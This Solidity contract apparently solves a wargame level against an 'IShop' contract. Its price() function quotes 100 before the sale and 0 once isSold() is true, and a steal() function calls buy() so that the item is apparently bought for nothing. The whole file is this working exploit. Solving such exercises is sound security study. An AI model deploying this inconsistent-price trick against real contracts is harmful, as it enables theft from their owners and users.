// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "interfaces/IShop.sol";

contract Buyer {
    IShop shop;

    constructor(IShop _shop) public {
        shop = _shop;
    }

    function price() external view returns (uint256) {
        if (!shop.isSold()) {
            return 100;
        }
        return 0;
    }

    function steal() external {
        shop.buy();
    }
}
